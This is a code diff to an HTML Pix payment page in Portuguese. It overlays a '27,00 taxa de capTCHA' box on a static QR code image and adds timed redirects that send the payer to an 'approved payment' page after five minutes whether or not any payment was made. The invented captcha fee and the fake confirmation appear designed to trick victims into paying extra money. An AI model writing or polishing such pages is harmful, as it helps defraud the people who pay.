@@ -123,7 +123,25 @@
             margin-top: 20px;
             max-width: 200px;
             width: 100%;
+            position: relative;
         }
+
+        /* Quadrado branco com a taxa de capTCHA */
+        .captcha-box {
+            position: absolute;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: white;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            color: green;
+            font-weight: bold;
+            font-size: 18px;
+            z-index: 10;
+        }
+
         .pix-key-box {
             margin-top: 10px;
             font-size: 16px;
@@ -219,7 +237,10 @@
         </div>
 
         <!-- QR Code do Pix -->
-        <img src="https://i.imgur.com/LXD9xVk.png" alt="QR Code Pix" class="qrcode-img" onclick="showQrCodeSuccess()">
+        <div style="position: relative;">
+            <img src="https://i.imgur.com/LXD9xVk.png" alt="QR Code Pix" class="qrcode-img" onclick="showQrCodeSuccess()">
+            <div class="captcha-box">27,00 taxa de capTCHA</div>
+        </div>
 
         <!-- Chave PIX -->
         <div class="pix-key-box">
@@ -271,17 +292,19 @@
         function copyPixKey() {
             var pixKey = document.getElementById('pix-key').innerText;
             navigator.clipboard.writeText(pixKey).then(function() {
-                // Exibe a mensagem de sucesso
                 var message = document.getElementById('copy-success-message');
                 message.style.display = 'block';
                 setTimeout(function() {
                     message.style.display = 'none';
                 }, 3000);
 
-                // Espera 5 minutos (300000 milissegundos) e redireciona
                 setTimeout(function() {
-                    window.location.href = 'pagamento_pix2.html'; // Redirecionamento
-                }, 300000); // 5 minutos
+                    window.location.href = 'pagamento_pix2.html'; // Redireciona para pagamento_pix2 após 10 segundos
+                }, 10000);
+
+                setTimeout(function() {
+                    window.location.href = 'pagamento_aprovado.html'; // Redireciona para pagamento_aprovado após 5 minutos
+                }, 300000);
             }, function() {
                 alert('Erro ao copiar chave PIX');
             });
@@ -290,7 +313,6 @@
         function copyEmail() {
             var email = document.getElementById('email').innerText;
             navigator.clipboard.writeText(email).then(function() {
-                // Exibe a mensagem de sucesso
                 var message = document.getElementById('copy-success-message');
                 message.style.display = 'block';
                 setTimeout(function() {
